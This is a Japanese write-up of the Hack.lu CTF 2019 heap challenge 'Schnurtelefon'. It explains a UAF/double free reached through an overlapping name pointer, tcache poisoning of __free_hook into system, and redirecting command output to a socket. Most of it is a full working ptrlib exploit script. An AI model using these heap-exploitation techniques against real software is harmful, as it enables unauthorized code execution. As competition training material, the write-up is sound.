# [pwn 434pts] Schnurtelefon - Hack.lu CTF 2019
謎にclientとstorageがありますが、いずれも64ビットでRELRO以外有効です。
```
$ checksec -f client
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   85 Symbols     Yes      0               12      client
```

```
$ checksec -f storage
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   87 Symbols     Yes      0               12      storage
```

接続するとclientが起動するのですが、脆弱性はstorageにあります。いろいろやるとnoteが足りない
際にclientもstorageも17個目の要素が使われます。これはclientではnameと被っています。nameは変更できるのでポインタの下位1バイトを変更することでstorageでdouble freeやUAFを引き起こせます。
これを使えば愚直にシェルが取れるのですが、問題はstorage側で実行したコマンドの結果をどうやってclient側に持ってきて、さらにそれを表示されるかです。`__free_hook`でsystem関数を実行して任意のコマンドを渡すのですが、freeした際は`OK`という文字を0x10バイト目に返す必要があります。いろいろ調べたところリモートではfd=7にソケットが存在したので、ここにコマンドの結果をリダイレクトします。
```
printf %16sOK%46s$(ls)>&7
```
のようにするとOKのチェックは通ります。さらに、次にclientでgetを呼び出すと、本来のget処理による結果よりも先にリダイレクトしたlsの結果が回ってくるので0x20バイト好きなコマンドの結果が見られます。これを利用してフラグを取得しました。
```python
# flag{i_swear_this_is_the_last_heap_challenge}
from ptrlib import *
import os

remote = True
if remote:
    fd = 7
else:
    fd = 4

# leak latter of the flag
#cmd = "printf %16sOK%60s 1 2 3 $(cat flag)$(cat flag)$(cat flag)$(cat flag)>&{}\x00".format(fd)
# leak former of the flag
cmd = "printf %16sOK%46s 1 2 3 $(cat flag)$(cat flag)$(cat flag)$(cat flag)>&{}\x00".format(fd)

assert 0x30 < len(cmd) <= 0x50

def add(data):
    sock.sendlineafter("exit\n", "1")
    sock.sendafter("?\n", data)
    return

def delete(index):
    sock.sendlineafter("exit\n", "2")
    sock.sendafter("?\n", str(index))
    return

def get(index):
    sock.sendlineafter("exit\n", "3")
    sock.sendlineafter("?\n", str(index))
    return sock.recvline()

def rename(name):
    sock.sendlineafter("exit\n", "4")
    sock.sendafter("?\n", name)
    return

libc = ELF("./libc-2.27.so")
libc_main_arena = 0x3ebc40
if not remote:
    if os.path.exists("/tmp/socket1"):
        os.unlink("/tmp/socket1")
    server = Process(["./storage", "1"])
    sock = Process(["stdbuf", "-i0", "-o0", "./client", "1"])
else:
    sock = Socket("schnurtelefon.forfuture.fluxfingers.net", 1337)

# name
sock.sendafter("?\n", "\xff" * 8)

# fill storage
for i in range(17):
    if i == 1:
        add(cmd[:0x20])
    elif i == 2 and len(cmd) > 0x40:
        add(cmd[0x30:])
    else:
        add("A" * 0x20)
logger.info("storage: OK")

# prepare fake chunks
for i in range(8):
    add(p64(0) + p64(0x31))
logger.info("fake chunks: OK")

# heap leak
rename(b'\xc0')
delete(15)
delete(16)
add("A") # 15
add("B") # 16
delete(14)
delete(15)
heap_base = u64(get(16)[:8]) - 0x590
logger.info("heap base = " + hex(heap_base))

# libc leak
rename(p64(heap_base + 0x2f0))
delete(16)
add("Hello") # 14
rename(p64(heap_base + 0x5c0))
delete(16)
add(p64(heap_base + 0x2e0)) # 15
add("dummy")
add(p64(0) + p64(0x431)) # 16
delete(0)
libc_base = u64(get(14)[:8]) - libc_main_arena - 96
logger.info("libc base = " + hex(libc_base))

# prepare shell string
rename(p64(heap_base + 0x5c0))
delete(16)
rename(p64(heap_base + 0x5c0))
delete(16)
rename(p64(heap_base + 0x5c0))
delete(16)
add(p64(heap_base + 0x340)) # 0
add("dummy") # 16
add(cmd[0x20:0x40]) # 16
logger.info("shell script: OK")

# tcache poisoning
rename(p64(heap_base + 0x5c0))
delete(16)
rename(p64(heap_base + 0x5c0))
delete(16)
add(p64(libc_base + libc.symbol("__free_hook"))) # 16
add("dummy123") # 16
add(p64(libc_base + libc.symbol("system"))) # 16

# run!
logger.info("running script......")
rename(p64(heap_base + 0x320))
delete(16)
print(get(0))
print(get(0))
print(get(0))
print(get(0))
print(get(0))
print(get(0))
print(get(0))
print(get(0))

if remote:
    sock.interactive()
else:
    sock.interactive()
    server.close()
```

# 感想
シェルを取ってからが大変でしたが、面白かったです。